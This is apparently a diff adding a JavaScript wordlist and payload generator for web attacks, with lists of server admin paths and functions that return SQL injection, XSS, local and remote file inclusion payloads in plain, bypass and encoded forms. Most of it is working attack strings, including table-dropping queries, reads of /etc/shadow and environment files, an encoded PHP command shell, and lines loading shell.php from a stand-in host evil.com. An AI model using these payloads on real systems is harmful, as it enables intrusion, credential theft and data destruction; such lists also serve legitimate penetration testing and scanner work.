+function getApachePaths() {
+    return [
+        '/server-status', '/server-info', '/apache', '/apache2',
+        '/httpd', '/cgi-bin/', '/icons/', '/manual/', '/phpmyadmin/',
+        '/phpinfo.php', '/test.php', '/info.php', '/php.php'
+    ];
+}
+
+function getNginxPaths() {
+    return [
+        '/nginx', '/nginx_status', '/status', '/basic_status',
+        '/stub_status', '/health', '/ping', '/metrics'
+    ];
+}
+
+function getTomcatPaths() {
+    return [
+        '/manager/', '/manager/html', '/manager/text', '/manager/status',
+        '/host-manager/', '/examples/', '/docs/', '/admin/', '/axis/',
+        '/axis2/', '/servlet/', '/struts/', '/spring/', '/webdav/'
+    ];
+}
+
+function getIISPaths() {
+    return [
+        '/iisadmin/', '/iishelp/', '/iissamples/', '/msadc/', '/scripts/',
+        '/certsrv/', '/printers/', '/aspnet_client/', '/exchange/',
+        '/exchweb/', '/owa/', '/public/', '/rpc/', '/rpcwithcert/'
+    ];
+}
+
+function getSQLInjectionPayloads(config) {
+    const payloads = [];
+    
+    if (config.basic) {
+        payloads.push(
+            // Basic injection attempts
+            "'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
+            "' OR 1=1/*", "admin'--", "admin'#", "admin'/*",
+            "' OR 'x'='x", "' OR 'a'='a", "' UNION SELECT 1--",
+            "1' OR '1'='1", "1' OR 1=1--", "1' OR 1=1#",
+            
+            // Double quote variations
+            '"', '""', '" OR "1"="1', '" OR 1=1--', '" OR 1=1#',
+            '" OR "x"="x', '" OR "a"="a', 'admin"--', 'admin"#',
+            
+            // Numeric injections
+            '1 OR 1=1', '1 OR 1=1--', '1 OR 1=1#', '1 OR 1=1/*',
+            '1) OR (1=1', '1) OR (1=1--', '1) OR (1=1#',
+            
+            // Boolean-based
+            "' OR 't'='t", "' OR 'test'='test", "' OR 1=1 AND 'a'='a",
+            "' OR 1=1 AND 'test'='test", "' OR 1=1 LIMIT 1--"
+        );
+    }
+    
+    if (config.advanced) {
+        payloads.push(
+            // UNION-based injections
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION SELECT 1,2,3--",
+            "' UNION SELECT user(),database(),version()--",
+            "' UNION SELECT table_name FROM information_schema.tables--",
+            "' UNION SELECT column_name FROM information_schema.columns--",
+            "' UNION SELECT schema_name FROM information_schema.schemata--",
+            "' UNION SELECT table_name,column_name FROM information_schema.columns--",
+            
+            // Time-based blind
+            "'; WAITFOR DELAY '00:00:05'--",
+            "'; SELECT SLEEP(5)--",
+            "' AND (SELECT SLEEP(5))--",
+            "' OR (SELECT SLEEP(5))--",
+            "'; pg_sleep(5)--",
+            
+            // Error-based
+            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
+            
+            // Stacked queries
+            "'; DROP TABLE users--",
+            "'; INSERT INTO users VALUES(1,'admin','admin')--",
+            "'; UPDATE users SET password='admin' WHERE id=1--",
+            "'; CREATE TABLE test (id INT)--",
+            "'; ALTER TABLE users ADD COLUMN test VARCHAR(255)--",
+            
+            // Database-specific functions
+            "' UNION SELECT @@version,@@hostname,@@datadir--",
+            "' UNION SELECT current_user(),current_database(),inet_server_addr()--",
+            "' UNION SELECT sqlite_version(),1,1--",
+            "' UNION SELECT banner FROM v$version--"
+        );
+    }
+    
+    if (config.bypass) {
+        payloads.push(
+            // Comment variations
+            "' /**/OR/**/1=1--", "' %2F%2A%2A%2FOR%2F%2A%2A%2F1=1--",
+            "' /*!50000OR*/ 1=1--", "' /*!50000UNION*/ /*!50000SELECT*/ 1--",
+            
+            // Logical operators
+            "' ||'1'='1", "' &&'1'='1", "' |'1'='1", "' &'1'='1",
+            "' OR '1'='1' ||'", "' AND '1'='1' &&'",
+            
+            // Case variations
+            "' Or 1=1--", "' oR 1=1--", "' OR 1=1--", "' or 1=1--",
+            "' UnIoN SeLeCt 1--", "' uNiOn SeLeCt 1--",
+            
+            // Whitespace bypass
+            "' OR(1)=(1)--", "' OR/**/1=1--", "' OR\t1=1--", "' OR\n1=1--",
+            "' OR\r1=1--", "' OR\r\n1=1--", "'/**/OR/**/1=1--",
+            
+            // Function-based bypass
+            "' OR ASCII(SUBSTRING('a',1,1))=97--",
+            "' OR CHAR(65)=CHAR(65)--", "' OR 'a'=CHAR(97)--",
+            
+            // Concatenation bypass
+            "' OR 'a'||'b'='ab'--", "' OR CONCAT('a','b')='ab'--",
+            "' OR 'a'+'b'='ab'--"
+        );
+    }
+    
+    if (config.encoded) {
+        payloads.push(
+            // URL encoding
+            "%27", "%22", "%27%20OR%201=1--", "%27%20OR%20%271%27=%271",
+            "%27%20UNION%20SELECT%201--", "%27%20OR%20%27a%27=%27a",
+            
+            // Double URL encoding
+            "%2527", "%2522", "%252527", "%25252527",
+            "%2527%2520OR%25201=1--", "%2527%2520UNION%2520SELECT%25201--",
+            
+            // Unicode encoding
+            "%u0027", "%u0022", "%u0027%u0020OR%u00201=1--",
+            "%u0027%u0020UNION%u0020SELECT%u00201--",
+            
+            // HTML entity encoding
+            "&#39;", "&#34;", "&#39; OR 1=1--", "&#39; UNION SELECT 1--",
+            "&apos;", "&quot;", "&apos; OR 1=1--",
+            
+            // Hex encoding
+            "0x27", "0x22", "0x27204f5220313d312d2d",
+            "CHAR(39)", "CHAR(34)", "CHAR(39,32,79,82,32,49,61,49)"
+        );
+    }
+    
+    return payloads;
+}
+
+function getXSSPayloads(config) {
+    const payloads = [];
+    
+    if (config.basic) {
+        payloads.push(
+            "<script>alert('XSS')</script>",
+            "<script>alert(1)</script>",
+            "<script>alert(document.cookie)</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>",
+            "<iframe src=javascript:alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<textarea onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>"
+        );
+    }
+    
+    if (config.advanced) {
+        payloads.push(
+            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
+            "<script>Function('a','l','e','r','t','(','1',')')('a','l','e','r','t','(','1',')')</script>",
+            "<script>setTimeout('alert(1)',0)</script>",
+            "<script>setInterval('alert(1)',1000)</script>",
+            "<script>window['ale'+'rt'](1)</script>",
+            "<script>top['ale'+'rt'](1)</script>",
+            "<script>parent['ale'+'rt'](1)</script>",
+            "<script>self['ale'+'rt'](1)</script>"
+        );
+    }
+    
+    if (config.bypass) {
+        payloads.push(
+            "<ScRiPt>alert('XSS')</ScRiPt>",
+            "<SCRIPT>alert('XSS')</SCRIPT>",
+            "<script>alert('XSS')</script>",
+            "<script src=//brutelogic.com.br/1.js></script>",
+            "<script>alert`XSS`</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<script>alert(/XSS/)</script>",
+            "<script>alert(document.domain)</script>"
+        );
+    }
+    
+    if (config.encoded) {
+        payloads.push(
+            "%3Cscript%3Ealert('XSS')%3C/script%3E",
+            "%3Cscript%3Ealert(1)%3C/script%3E",
+            "%3Cimg%20src=x%20onerror=alert('XSS')%3E",
+            "%3Csvg%20onload=alert('XSS')%3E",
+            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;"
+        );
+    }
+    
+    return payloads;
+}
+
+function getLFIPayloads(config) {
+    const payloads = [];
+    
+    if (config.basic) {
+        payloads.push(
+            "../../../etc/passwd",
+            "../../../etc/hosts",
+            "../../../etc/shadow",
+            "../../../etc/group",
+            "../../../etc/issue",
+            "../../../etc/hostname",
+            "../../../etc/ssh/ssh_config",
+            "../../../etc/ssh/sshd_config",
+            "../../../var/log/auth.log",
+            "../../../var/log/apache2/access.log",
+            "../../../var/log/apache2/error.log",
+            "../../../var/log/nginx/access.log",
+            "../../../var/log/nginx/error.log",
+            "../../../proc/version",
+            "../../../proc/cmdline",
+            "../../../proc/self/environ"
+        );
+    }
+    
+    if (config.advanced) {
+        payloads.push(
+            "....//....//....//etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%252F..%252F..%252Fetc%252Fpasswd",
+            "php://filter/read=convert.base64-encode/resource=index.php",
+            "php://filter/convert.base64-encode/resource=../config.php",
+            "data://text/plain,<?php echo shell_exec('id'); ?>",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+            "expect://id",
+            "file:///etc/passwd",
+            "file:///etc/hosts"
+        );
+    }
+    
+    if (config.bypass) {
+        payloads.push(
+            "....//....//....//etc/passwd%00",
+            "../../../etc/passwd%00",
+            "../../../etc/passwd%00.jpg",
+            "../../../etc/passwd%00.txt",
+            "../../../etc/passwd%00.html",
+            "../../../etc/passwd\x00",
+            "../../../etc/passwd\x00.jpg"
+        );
+    }
+    
+    if (config.encoded) {
+        payloads.push(
+            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
+            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts",
+            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fshadow",
+            "%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
+        );
+    }
+    
+    return payloads;
+}
+
+function getRFIPayloads(config) {
+    const payloads = [];
+    
+    if (config.basic) {
+        payloads.push(
+            "http://evil.com/shell.php",
+            "https://evil.com/shell.php",
+            "ftp://evil.com/shell.php",
+            "http://evil.com/shell.txt",
+            "https://evil.com/shell.txt",
+            "http://pastebin.com/raw/shell",
+            "https://pastebin.com/raw/shell",
+            "http://evil.com/shell.php?",
+            "https://evil.com/shell.php?",
+            "http://evil.com/shell.php%00",
+            "https://evil.com/shell.php%00"
+        );
+    }
+    
+    if (config.advanced) {
+        payloads.push(
+            "data://text/plain,<?php system($_GET['cmd']); ?>",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+            "php://input",
+            "php://filter/read=convert.base64-encode/resource=http://evil.com/shell.php",
+            "expect://id",
+            "expect://whoami",
+            "expect://ls",
+            "expect://cat /etc/passwd"
+        );
+    }
+    
+    if (config.bypass) {
+        payloads.push(
+            "http://evil.com/shell.php%00",
+            "https://evil.com/shell.php%00",
+            "http://evil.com/shell.php%00.jpg",
+            "https://evil.com/shell.php%00.jpg",
+            "http://evil.com/shell.php\x00",
+            "https://evil.com/shell.php\x00"
+        );
+    }
+    
+    if (config.encoded) {
+        payloads.push(
+            "http%3A%2F%2Fevil.com%2Fshell.php",
+            "https%3A%2F%2Fevil.com%2Fshell.php",
+            "http%3A//evil.com/shell.php",
+            "https%3A//evil.com/shell.php",
+            "http%3A%2F%2Fevil.com%2Fshell.php%00",
+            "https%3A%2F%2Fevil.com%2Fshell.php%00"
+        );
+    }
+    
+    return payloads;
+}
+
+// Export for potential module use
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = {
+        generateEnumeration,
+        generateBruteForce,
+        generateCredentials,
+        generateUsernames,
+        generatePatterns,
+        generateHybrid,
+        generateAPI,
+        generateWebTech,
+        generateSecurity
+    };
+}
